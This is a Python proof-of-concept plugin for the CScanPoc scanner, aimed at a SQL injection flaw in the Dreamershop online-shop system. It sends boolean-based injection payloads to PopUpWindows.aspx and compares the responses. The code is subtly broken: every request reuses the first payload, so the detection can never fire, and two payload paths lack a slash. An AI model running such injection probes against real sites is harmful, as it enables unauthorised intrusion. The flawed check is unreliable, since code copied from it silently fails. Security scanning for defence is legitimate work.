# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Dreamershop_0006'  # 平台漏洞编号，留空
    name = 'Dreamershop梦想家网店系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-24'  # 漏洞公布时间
    desc = '''
        Dreamershop梦想家网店系统多处存在SQL注入漏洞：
        '/PopUpWindows.aspx?id=1',
        'PopUpWindows.aspx?id=1%20and%201=1',
        'PopUpWindows.aspx?id=1%20and%201=2'
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0121914'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Dreamershop(梦想家网店系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4a4952c5-9d31-4dc8-8d25-3c6dd0b2983f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2015-0121914
            payload = ['/PopUpWindows.aspx?id=1', 'PopUpWindows.aspx?id=1%20and%201=1',
                       'PopUpWindows.aspx?id=1%20and%201=2']
            verify_url1 = self.target + payload[0]
            verify_url2 = self.target + payload[0]
            verify_url3 = self.target + payload[0]
            req1 = requests.get(verify_url1)
            req2 = requests.get(verify_url2)
            req3 = requests.get(verify_url3)

            # if code==200 and code1==200 and code2==200 and res==res1 and res!=res2:
            if req1.status_code == 200 and req2.status_code == 200 and req3.status_code == 200:
                if req1.text == req2.text and req1.text != req3.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
